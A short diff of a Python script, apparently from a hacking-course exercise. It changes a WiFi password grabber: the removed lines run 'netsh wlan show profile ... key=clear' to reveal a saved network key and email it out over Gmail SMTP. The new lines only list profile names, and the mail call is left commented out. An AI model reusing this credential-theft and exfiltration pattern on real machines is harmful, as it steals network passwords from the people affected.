@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import subprocess, smtplib
+import subprocess, smtplib, re
 
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
@@ -9,7 +9,9 @@ def send_mail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
 
-command = "netsh wlan show profile CGN-78D0 key=clear"
+command = "netsh wlan show profile"
 
-result = subprocess.check_output(command, shell=True)
-send_mail("", "", result)
+networks = subprocess.check_output(command, shell=True).decode('utf-8')
+network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
+print(network_names)
+# send_mail("", "", result)
